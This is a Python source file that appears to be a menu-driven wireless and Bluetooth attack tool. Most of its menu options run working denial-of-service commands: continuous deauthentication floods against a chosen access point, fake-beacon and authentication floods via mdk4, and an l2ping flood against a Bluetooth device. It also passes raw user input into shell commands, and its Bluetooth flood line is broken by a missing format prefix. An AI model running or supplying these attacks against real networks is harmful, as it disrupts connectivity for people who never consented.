import subprocess
import configs

def choice_action(choice: int):

	print('')

	match choice:

		case 1:

			bssid = input(' [*] AP BSSID: ')
			channel = input(' [*] AP channel:  ')
			
			bssid = bssid.replace(' ', '')
			channel = channel.replace(' ', '')

			process = subprocess.Popen([f'sudo airodump-ng {configs.adapter_name_mon} --channel {channel}'], stdout=subprocess.DEVNULL, shell = True)
			process.kill()

			print('')

			subprocess.run([f'sudo aireplay-ng -0 0 -a {bssid} {configs.adapter_name_mon}'], shell=True)

			input(' Press Enter:')

		case 2:

			print (' [*] I create AP\'s...')

			print('')

			subprocess.run([f'sudo mdk4 {configs.adapter_name_mon} b -ams 500'], shell=True)

			input(' Press Enter:')

		case 3:

			bssid = input(' [*] AP BSSID: ')
			bssid = bssid.replace(' ', '')

			print('')

			subprocess.run([f'sudo mdk4 {configs.adapter_name_mon} a -a {bssid}'], shell=True)

			input(' Press Enter:')

		case 4:

			print(' Sending packets to air...')

			print('')

			subprocess.run([f'sudo mdk4 {configs.adapter_name_mon} f -sap -s abp -m bmstm -p 9000'], shell=True)

			input(' Press Enter:')

		case 5:

			subprocess.run(['sudo hciconfig hci0 up'], shell=True)
			
			bssid = input(str(' [*] BSSID bluetooth device: '))
			bssid = bssid.replace(' ', '')

			print('')

			subprocess.run(['sudo l2ping -i hci0 -s 900 -f {bssid}'], shell=True)
			subprocess.run(['sudo hciconfig hci0 down'], shell=True)

			input(' Press Enter:')

		case 6:

			print(' [*] Putting your adapter into monitor mode...')

			print('')

			subprocess.run([f'sudo airmon-ng start {configs.adapter_name}'], shell=True)

			input(' Press Enter:')

		case 7:

			print(' [*] Taking your adapter out of monitor mode...')

			print('')

			subprocess.run([f'sudo airmon-ng stop {configs.adapter_name_mon}'], shell=True)

			input(' Press Enter:')

		case 8:

			print(' [*] Capturing and processing packets...')

			print('')

			subprocess.run([f'sudo airodump-ng {configs.adapter_name_mon}'], shell=True)

			input(' Press Enter:')

		case 9:

			print(' [*] Capturing bluetooth packets...')

			print('')

			subprocess.run(['sudo hciconfig hci0 up'], shell=True)
			subprocess.run(['sudo xterm -hold -e hcitool scan'], shell=True)
			subprocess.run(['sudo hciconfig hci0 down'], shell=True)

			input(' Press Enter:')

		case 10:

			print(configs.help)
			print('')

			choice = input(' Enter - back: ')

		case 88:

			choice = input(' [*] Are you sure you want to exit? Y/n\n :')
			choice = choice.replace(' ', '').lower()

			if choice == 'y':

				print(configs.console_clear)
				
				print(' [*] Bye! ')

				exit(0)
